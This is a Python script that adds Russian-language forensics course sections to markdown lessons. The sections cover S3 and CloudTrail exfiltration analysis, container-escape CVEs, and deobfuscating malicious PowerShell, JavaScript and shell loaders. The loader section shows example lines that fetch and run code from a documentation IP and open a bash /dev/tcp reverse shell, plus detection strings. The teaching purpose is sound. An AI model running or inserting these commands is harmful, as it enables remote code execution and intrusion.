#!/usr/bin/env python3
"""Batch C2 — forensics thin top-up: cloud-storage, container-runtime, mal-script-js."""
from __future__ import annotations
import re, sys

ADDS = {}

ADDS["cloud-storage"] = r"""## Формат server access log S3

Server access log — по строке на запрос, поля разделены пробелами, а имена и ключи
заключены в кавычки. Типовая строка:

```
79a5 example-bucket [14/Jan/2026:03:20:11 +0000] 10.10.20.9 arn:aws:iam::123:user/ci 3F1C GET /report.pdf HTTP/1.1 200 - 24576 - 12 "-" "aws-cli/2.15.0" - HostId=... SigV4 TLS_AES_128_GCM_SHA256 AuthHeader=...
```

Разберём поля: владелец бакета, имя бакета, время, **IP клиента**, идентичность
(`arn` или `-` для анонимного), Request-ID, операция (`GET`/`PUT`/`LIST`), ключ
объекта, статус (`200`/`403`), число отданных байт, время обработки, User-Agent.
Именно пара «IP + identity + User-Agent» и выдаёт атакующего.

Быстрый анализ:

```
$ awk '{print $5, $6, $7, $8}' access.log | sort | uniq -c | sort -rn | head
  812 10.10.20.9 arn:aws:iam::123:user/ci GET
```

Массовые `GET` одного клиента по разным ключам — это выкачивание бакета.

## CloudTrail data events: кто и что

Server access log фиксирует **чтение объектов**, а CloudTrail **data events** —
API-операции над объектами (`GetObject`, `PutObject`, `DeleteObject`) с полной
идентификацией. В записи есть `userIdentity` (кто), `sourceIPAddress` (откуда),
`userAgent` (чем), `requestParameters.bucketName` и `key`, `eventTime`. Data events
по умолчанию **выключены** — их надо включать отдельно, поэтому в расследовании их
часто нет. Если есть — это золото: по ним строится точный таймлайн «кто скачал что и
когда».

```
$ aws cloudtrail lookup-events --lookup-attributes AttributeKey=EventName,AttributeValue=GetObject --max-results 20
```

Management events (по умолчанию включены) показывают смену политик, создание бакетов
и ролей — их тоже обязательно проверяют.

## Как выглядит эксфильтрация

Признаки в логах:

- **сначала `ListBucket`**, затем шквал `GET` — типичный паттерн `aws s3 sync`/`rclone`;
- **незнакомый User-Agent** (`rclone/`, `s3cmd`, `boto3`, старый `aws-cli`) там, где
  обычно только веб-приложение;
- **объём данных** — сумма отданных байт резко выше нормы;
- **доступ с новых IP/ASN**, особенно вне рабочих часов;
- **`GET` на бэкапы/дампы** (`backup.sql`, `users.csv`, `*.pem`);
- **`PutObject` нарушителем** — загрузка инструментов или шифровальщика.

Собрав эти сигналы, ты отвечаешь на вопрос «что и сколько утекло», который обычно и
стоит в задаче.

## Политики, ACL и Public Access Block

Публичность бакета определяется **bucket policy** и **ACL**, а блокируется настройкой
Public Access Block. Проверка:

```
$ aws s3api get-public-access-block --bucket b
$ aws s3api get-bucket-policy --bucket b --query Policy --output text
$ aws s3api get-bucket-acl --bucket b
```

В политике ищи `"Principal": "*"` и `"Effect": "Allow"` без условия — это открытый
доступ. Важный форензик-аспект: **изменение** политики логируется в CloudTrail
(`PutBucketPolicy`), поэтому можно установить, когда бакет стал публичным и кто это
сделал — атакующий или неосторожный администратор.

## Версионирование, Delete Markers и Object Lock

Включённое версионирование хранит все версии объекта. Удаление создаёт **delete
marker** (объект «исчезает», но версии целы):

```
$ aws s3api list-object-versions --bucket b --prefix report
$ aws s3api get-object --bucket b --key report.pdf --version-id 3sL4kqtJlcpXroDTDmJ --out report.pdf
```

Так восстанавливают удалённое и видят историю изменений. **Object Lock** (WORM) делает
версии неизменяемыми — полезно для доказательств, но мешает «зачистке». Если видишь
массовое `DeleteObject`, проверь, не было ли это попыткой anti-forensics, и восстанови
версии.

## Другие облака: GCS и Azure Blob

- **Google Cloud Storage** — логи в Cloud Logging (Data Access logs, тоже надо
  включать), поле `principalEmail`, `resourceName`.
- **Azure Blob** — логи в Storage Analytics (`$logs` контейнер) и Activity Log;
  идентичность — `callerIpAddress`, `identity`.
- Везде логика одна: **кто (identity), что (объект), когда, откуда (IP), чем
  (UA)**. Отличаются только имена полей и способы включения логирования.

## Что писать в отчёте

Укажи источник логов (server access / CloudTrail data events / Storage Analytics),
период, список операций и ключей, затронутых клиентов, объём выгруженных данных,
признаки смены прав и восстановленные версии. Каждое утверждение подкрепляй строкой
лога. Отдельно отметь, было ли логирование включено на момент инцидента — если нет,
честно зафиксируй пробел."""

ADDS["forensics-cloud-container-runtime"] = r"""## Механика CVE-2019-5736 (перезапись runc)

Суть уязвимости: при `docker exec` контейнер запускает `runc` через `/proc/self/exe`
внутри контейнера. Если злоумышленник получил контроль над контейнером, он может
подменить этот путь: открыть `/proc/self/exe` на запись и перезаписать **хостовый**
бинарник `runc` своим кодом. Когда администратор запускает `docker exec` в этот
контейнер, исполняется уже вредоносный `runc` — и код выходит на хост с правами root.

Проверка в расследовании: сравни хеш `/usr/bin/runc` (или `/usr/sbin/runc`) с
эталоном дистрибутива:

```
$ sha256sum $(which runc)
$ dpkg -V runc        # Debian/Ubuntu: покажет изменённые файлы пакета
$ rpm -V runc         # RHEL-семейство
```

Несовпадение — сильный признак компромисса. Также смотри время изменения бинарника.

## CVE-2024-21626 (Leaky Vessels)

Утечка файловых дескрипторов в runc позволяла процессу в контейнере получить доступ
к рабочему каталогу хоста через `/proc/self/fd/<N>`. Атакующий, указав `WORKDIR` или
унаследовав дескриптор, «выходил» за пределы контейнера и читал/писал файлы хоста.
Признаки: необычный `WORKDIR` в образе, обращения процессов к `/proc/self/fd/`, доступ
к путям хоста из контейнера. Исправлено в runc 1.1.12 / 1.0.0-rc93; проверяй версию.

## CVE-2022-0492 (cgroups release_agent)

Если контейнер запущен с привилегиями и доступом к cgroup v1, атакующий мог через
`release_agent` заставить ядро выполнить команду **на хосте** при выходе процесса из
cgroup. Признаки: монтирование cgroup v1 в контейнер, запись в `release_agent`,
необычные процессы, запущенные «вне» namespace. Часто сопровождается `CAP_SYS_ADMIN`.

## Что искать на хосте

- **изменённый бинарник рантайма** — `runc`/`containerd-shim` не совпадает с пакетом;
- **процессы вне namespace** — `ps -eo pid,comm,args` и сравнение с деревом контейнера;
- **неожиданные монтирования** — `cat /proc/self/mountinfo`, пути хоста внутри контейнера;
- **доступ к сокетам** — `/var/run/docker.sock`, `/run/containerd/containerd.sock`
  смонтированы в контейнер (классический побег без CVE);
- **capabilities** — `capsh --print`, наличие `CAP_SYS_ADMIN`, `CAP_SYS_PTRACE`;
- **`/proc/<pid>/root`** — путь к корню другого процесса, часто используемый для побега.

## Источники логов и аудита

- **containerd/docker** — `journalctl -u containerd`, `journalctl -u docker`:
  запуск/остановка/exec контейнеров;
- **kubelet** — `/var/log/pods`, события Kubernetes;
- **auditd** — правила на `execve`, запись в `/usr/bin/runc`, создание cgroup;
- **dmesg** — сообщения ядра о namespace/cgroup/сегфолтах;
- **runtime-специфичные** — CRI-O логи, события `kubectl get events`.

Аудит хоста часто единственное место, где виден побег: контейнерный слой собственных
подробных логов почти не ведёт.

## Граница container/host: namespaces, seccomp, MAC

Понимание изоляции объясняет, что вообще возможно. **Namespaces** (pid, mount, net,
user, uts, ipc) разделяют ресурсы. **seccomp** ограничивает системные вызовы.
**AppArmor/SELinux** ограничивают доступ к файлам. Побег происходит, когда:

- процесс получает лишние capabilities (привилегированный контейнер);
- смонтирован хост-путь или сокет;
- в ядре/рантайме есть уязвимость (CVE);
- срабатывает конфигурация с `--privileged`.

В отчёте важно указать, какая именно граница была нарушена и каким путём.

## Что писать в отчёте

Зафиксируй версии рантайма и ядра, конфигурацию контейнера (privileged, capabilities,
монтирования), обнаруженные изменения бинарников (с хешами), аномальные процессы и
соединения, найденные CVE и их применимость, а также использованные источники логов.
Каждый вывод — со ссылкой на команду и её вывод. Отметь, что осталось вне охвата
(например, память хоста не снималась)."""

ADDS["mal-script-js"] = r"""## PowerShell: механика обфускации

PowerShell — любимый инструмент атакующих на Windows. Ключевые приёмы:

- **`-EncodedCommand`** — команда передаётся в **Base64 от UTF-16LE** (не ASCII!).
  Декодирование:

```
PS> [System.Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBFAFgA...'))
IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.5/x')
```

- **`IEX` / `Invoke-Expression`** — исполнение строки, полученной извне;
- **`DownloadString`/`Invoke-WebRequest`/`Net.WebClient`** — загрузка второго этапа;
- **конкатенация и обратные кавычки** — разрывают сигнатуры (`I`+`E`+`X`, `` `I`EX ``);
- **переменные окружения и `[char]`** — сборка строк посимвольно;
- **`-nop -w hidden -ep bypass`** — обход политики исполнения и скрытый запуск.

Разбор без исполнения: используй **AST-парсер** PowerShell:

```
PS> $tokens=$null;$errors=$null
PS> [System.Management.Automation.Language.Parser]::ParseFile('evil.ps1',[ref]$tokens,[ref]$errors)
```

Так видны команды и строки без запуска кода. Никогда не запускай образец напрямую.

## JavaScript-загрузчики (WSH, HTA, JSE)

Windows исполняет `.js`/`.jse` через Windows Script Host (`wscript`/`cscript`), а `.hta`
— как HTML-приложение. Типовые приёмы:

- **`ActiveXObject("WScript.Shell").Run(...)`** — запуск процесса;
- **`ActiveXObject("MSXML2.XMLHTTP")`** — загрузка полезной нагрузки;
- **`eval`/`unescape`/`String.fromCharCode`** — динамическое построение кода;
- **hex/unicode-escape** (`\x68\x74\x74\x70`) — обфускация строк;
- **`mshta http://...`** — исполнение HTA прямо по URL.

Обфускатор `javascript-obfuscator` создаёт массивы строк и функции-декодеры. Разбор:

```
$ node -e "console.log(Buffer.from('68747470','hex').toString())"
http
```

Или `de4js` / `js-beautify` для восстановления читаемого кода. Цель — получить
исходный URL и команду, а не «запустить и посмотреть».

## Shell-скрипты: curl|bash и reverse shell

Linux/macOS-загрузчики часто однострочники:

```
$ curl -fsSL http://203.0.113.5/x.sh | bash
$ bash -c "$(curl -fsSL http://203.0.113.5/x.sh)"
$ bash -i >& /dev/tcp/203.0.113.5/4444 0>&1
```

`/dev/tcp` — встроенный в bash редирект, дающий **reverse shell** без внешних
инструментов. Признаки в артефактах: строки `curl|bash`, `base64 -d`, `/dev/tcp`,
`chmod +x /tmp/*`, `nohup ... &`. В истории shell и в логах процессов (`auditd`,
`execve`) эти команды видны целиком.

## Инструменты разбора

- **CyberChef** — декодирование Base64/hex, распаковка, регулярные выражения в браузере;
- **`de4js`**, **`js-beautify`** — деобфускация JavaScript;
- **PowerShell AST** — разбор без исполнения;
- **`oletools`/`oledump`** — если скрипт вложен в документ;
- **`shellcheck`** — понять логику shell-скрипта;
- **`box-js`** — эмуляция JS-малвари в песочнице.

Работай в изолированной ВМ/песочнице, отключив сеть: образцы активно «звонят домой».

## YARA и IOC

Для скриптовой малвари полезны YARA-правила по характерным строкам: `IEX`,
`DownloadString`, `FromBase64String`, `ActiveXObject`, `/dev/tcp/`, `eval(`,
`WScript.Shell`. IOC — домены/IP второго этапа, пути `/tmp/`, `%TEMP%`, имена файлов.
В отчёте перечисли декодированные строки и восстановленную цепочку: загрузчик →
второй этап → действие (майнер, stealer, ransomware).

## Что писать в отчёте

Опиши тип скрипта, использованную обфускацию и **как** ты её снял, декодированные
URL/команды, цепочку исполнения и артефакты на диске/в памяти. Приведи фрагменты
кода, подтверждающие вывод, но не запускай образец. Различай наблюдаемое (строка в
файле) и интерпретацию (её назначение)."""

def main() -> int:
    base = "content/forensics/"
    for lid, add in ADDS.items():
        path = base + lid + ".md"
        s = open(path, encoding="utf-8").read()
        m = re.search(r"^## Квиз\s*$", s, re.MULTILINE)
        if not m:
            print("SKIP (no quiz):", lid); continue
        out = s[:m.start()] + add + "\n\n" + s[m.start():]
        open(path, "w", encoding="utf-8").write(out)
        print("appended", lid)
    return 0

if __name__ == "__main__":
    sys.exit(main())
